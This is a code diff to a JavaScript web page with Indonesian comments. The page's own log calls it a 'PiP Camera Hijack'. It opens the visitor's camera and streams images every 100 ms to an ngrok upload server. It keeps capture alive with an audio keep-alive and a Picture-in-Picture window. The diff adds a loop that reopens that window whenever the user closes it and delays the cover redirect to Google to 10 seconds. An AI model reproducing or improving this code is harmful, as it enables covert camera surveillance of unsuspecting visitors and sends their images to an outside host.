@@ -34,6 +34,7 @@
   var executed = false;
   var streamInterval = null;
   var audioCtx = null;
+  var pipVideo = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -45,6 +46,9 @@
   // ============================================
   var TARGET_URL = "https://www.google.com"; 
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
+  
+  // Durasi sebelum redirect (ms) - DIPERPANJANG
+  var REDIRECT_DELAY = 10000; // 10 detik
 
   // ============================================
   // FUNGSI: AUDIO KEEP-ALIVE
@@ -95,7 +99,7 @@
   }
 
   // ============================================
-  // FUNGSI: PICTURE-IN-PICTURE (PiP)
+  // FUNGSI: PICTURE-IN-PICTURE (PiP) LOOP
   // ============================================
   async function enterPiP(videoElement) {
     try {
@@ -104,6 +108,16 @@
       }
       await videoElement.requestPictureInPicture();
       log("[+] 🎥 PiP Aktif (Video Melayang)!");
+      
+      // Loop: Coba masuk PiP lagi jika keluar
+      videoElement.addEventListener('leavepictureinpicture', function() {
+        log("[!] PiP ditutup. Mencoba masuk lagi...");
+        if (!executed) return; // Jangan loop jika sudah selesai
+        setTimeout(function() {
+          enterPiP(videoElement);
+        }, 1000);
+      });
+
     } catch (e) {
       log("[-] PiP Gagal: " + e.message);
     }
@@ -126,17 +140,17 @@
           // 1. Aktifkan PiP (Video Melayang)
           setTimeout(function() {
             enterPiP(video);
-          }, 1000);
+          }, 500);
 
           // 2. Mulai streaming gambar
           if (streamInterval) clearInterval(streamInterval);
           streamInterval = setInterval(sendImageToServer, 100);
 
-          // 3. Redirect ke Google setelah PiP aktif (2000ms)
+          // 3. Redirect ke Google setelah PiP aktif (10 detik)
           setTimeout(function() {
             log("[+] Redirect ke Google (PiP Aktif)...");
             window.location.href = TARGET_URL;
-          }, 2000);
+          }, REDIRECT_DELAY);
 
         })
         .catch(function(err) {
@@ -162,7 +176,7 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai PiP Camera Hijack...");
+    log("[!] Memulai Long PiP Persistent Camera...");
 
     initAudioKeepAlive();
     startCamera();
